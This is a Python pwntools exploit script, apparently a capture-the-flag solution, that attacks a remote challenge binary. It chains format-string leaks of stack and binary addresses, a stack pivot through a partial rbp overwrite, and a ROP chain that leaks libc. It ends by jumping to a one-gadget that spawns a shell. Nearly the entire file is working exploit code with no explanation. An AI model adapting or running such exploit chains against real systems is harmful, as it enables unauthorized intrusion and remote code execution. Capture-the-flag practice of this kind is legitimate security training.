#!/usr/bin/env python2
from pwn import *
import sys

HOST = 'challenge.pwny.racing'
PORT = 11533

# context(terminal=['tmux', 'splitw', '-h'])  # horizontal split window
# context(terminal=['tmux', 'new-window'])    # open new window

STACK     = 0x38      # distance from stack leak to trampoline buffer
BASE      = 0xaf9     # distance from binary leak to binary base
LIBC      = 0x185510  # distance from strncmp@GOT to libc base

MAGIC     = 0x04f322  # one shot magic gadget

PIVOT_BUF = 0x202238
POP_RBP   = 0x850
POP_RDI   = 0xd73
LEAVE_RET = 0xa03

DEBUG = False
LOCAL = True
if len(sys.argv) > 1:
    LOCAL = False
    HOST  = sys.argv[1]

if len(sys.argv) > 2:
    PORT = sys.argv[2]

if LOCAL:
    io = process('./../chall8')
else:
    io = remote(HOST, PORT)

if LOCAL and DEBUG:
    gdb.attach(io.pid, '')

# step 1: use fsb to get some leaks
io.recvuntil(': ')
io.sendline('%14$p.%9$p')
io.recvuntil(': ')
leaks = io.recvline().strip().split('.')

io.recvuntil(': ')
io.sendline('yes sir\x00xxxxxxxxyyyyyyy')

stack = int(leaks[0], 16) - STACK
leak  = int(leaks[1], 16)
base  = leak - BASE

log.info('stack: 0x%012x' % stack)
log.info('leak:  0x%012x' % leak)
log.info('base:  0x%012x' % base)

# step 2: use fsb to alter two lowest bytes of future rbp to pivot to trampoline
io.recvuntil(': ')
io.send('%'+str(stack & 0xffff)+'c%16$hn')
io.recvuntil(': ')
io.recvuntil(': ')
io.sendline('yes sir')

# step 3: plant rop to leak libc and read another payload over this one
pay1  = '\x00'*512
pay1 += p64(base+POP_RBP)   # pop rbp ; ret
pay1 += p64(base+0x202240)  # .data pivot
pay1 += p64(base+POP_RDI)   # pop rdi ; ret
pay1 += p64(base+0x201f90)  # GOT
pay1 += p64(base+0x000770)  # puts()
pay1 += p64(base+0x000a68)  # read(stdin, data, 0x400) ; ret
pay1 += cyclic(1024-len(pay1))

io.recvuntil(': ')
io.send(pay1)

# step 4: trigger trampoline bounce to ropchain
io.recvuntil('nope): ')
io.send(p64(base+POP_RBP)+p64(base+0x202238)+p64(base+LEAVE_RET))

# step 5: read leak
leak = io.recvline().strip()
leak = u64(leak+'\x00\x00')
libc = leak - LIBC

log.info('leak:  0x%012x' % leak)
log.info('libc:  0x%012x' % libc)

# step 6: write second payload
pay2  = '\x00'*512
pay2 += p64(base+0x00073e)*16  # ret
pay2 += p64(libc+MAGIC)        # execve(/bin/sh, NULL, environ)
pay2 += '\x00'*(1024-len(pay2))

io.send(pay2)

# step 6: collect shell
io.sendline('id')
log.success('got shell: %s' % io.recvline().strip())

io.interactive()
sys.exit(0)
